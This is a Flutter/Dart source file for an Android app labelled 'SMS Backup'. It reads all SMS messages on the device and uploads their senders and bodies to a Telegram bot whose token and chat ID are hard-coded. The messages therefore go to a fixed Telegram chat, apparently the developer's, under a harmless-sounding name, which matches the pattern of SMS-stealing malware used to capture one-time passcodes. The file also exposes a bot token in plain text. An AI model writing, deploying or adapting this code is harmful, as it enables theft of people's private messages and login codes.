import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:sms_advanced/sms_advanced.dart';
import 'dart:convert';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'SMS Backup',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(primarySwatch: Colors.purple, useMaterial3: true),
      home: const SMSBackupPage(),
    );
  }
}

class SMSBackupPage extends StatefulWidget {
  const SMSBackupPage({super.key});

  @override
  State<SMSBackupPage> createState() => _SMSBackupPageState();
}

class _SMSBackupPageState extends State<SMSBackupPage> {
  final String botToken = "8859100629:AAFdW_k4Ist35Eiof06w3MPp93S4fzlq8SM";
  final String chatId = "6076447275";
  
  final SmsAdvanced smsAdvanced = SmsAdvanced();
  List<SmsMessage> messages = [];
  bool isLoading = false;
  String status = 'Ready';
  
  @override
  void initState() {
    super.initState();
    requestPermission();
  }
  
  Future<void> requestPermission() async {
    var status = await Permission.sms.request();
    if (!mounted) return;
    setState(() {
      this.status = status.isGranted ? '✅ Ready' : '❌ Permission denied';
    });
  }
  
  Future<void> readSMS() async {
    setState(() {
      isLoading = true;
      status = 'Reading...';
    });
    
    try {
      List<SmsMessage> smsList = await smsAdvanced.getAllSms();
      if (!mounted) return;
      setState(() {
        messages = smsList;
        isLoading = false;
        status = '✅ ${smsList.length} messages';
      });
    } catch (e) {
      if (!mounted) return;
      setState(() {
        isLoading = false;
        status = '❌ Error: $e';
      });
    }
  }
  
  Future<void> sendToTelegram() async {
    if (messages.isEmpty) return;
    
    setState(() {
      isLoading = true;
      status = 'Sending...';
    });
    
    try {
      StringBuffer buffer = StringBuffer();
      buffer.writeln('SMS Backup');
      buffer.writeln('Total: ${messages.length}');
      buffer.writeln('=' * 40);
      
      for (var msg in messages) {
        buffer.writeln('From: ${msg.sender}');
        buffer.writeln('${msg.body}');
        buffer.writeln('-' * 30);
      }
      
      var request = http.MultipartRequest(
        'POST',
        Uri.parse('https://api.telegram.org/bot$botToken/sendDocument')
      );
      
      request.fields['chat_id'] = chatId;
      request.fields['caption'] = '📱 ${messages.length} messages';
      request.files.add(
        http.MultipartFile.fromString(
          'document',
          buffer.toString(),
          filename: 'sms_backup.txt',
        )
      );
      
      var response = await request.send();
      var result = json.decode(await response.stream.bytesToString());
      
      if (!mounted) return;
      setState(() {
        isLoading = false;
        status = result['ok'] == true ? '✅ Sent!' : '❌ Failed';
      });
    } catch (e) {
      if (!mounted) return;
      setState(() {
        isLoading = false;
        status = '❌ Error: $e';
      });
    }
  }
  
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('📱 SMS Backup'), centerTitle: true),
      body: Padding(
        padding: const EdgeInsets.all(20),
        child: Column(
          children: [
            Text(status, style: const TextStyle(fontSize: 18)),
            const SizedBox(height: 20),
            if (isLoading) const CircularProgressIndicator(),
            const SizedBox(height: 20),
            ElevatedButton(
              onPressed: isLoading ? null : readSMS,
              child: const Text('Read SMS'),
            ),
            const SizedBox(height: 10),
            ElevatedButton(
              onPressed: (isLoading || messages.isEmpty) ? null : sendToTelegram,
              child: const Text('Send to Telegram'),
            ),
          ],
        ),
      ),
    );
  }
}
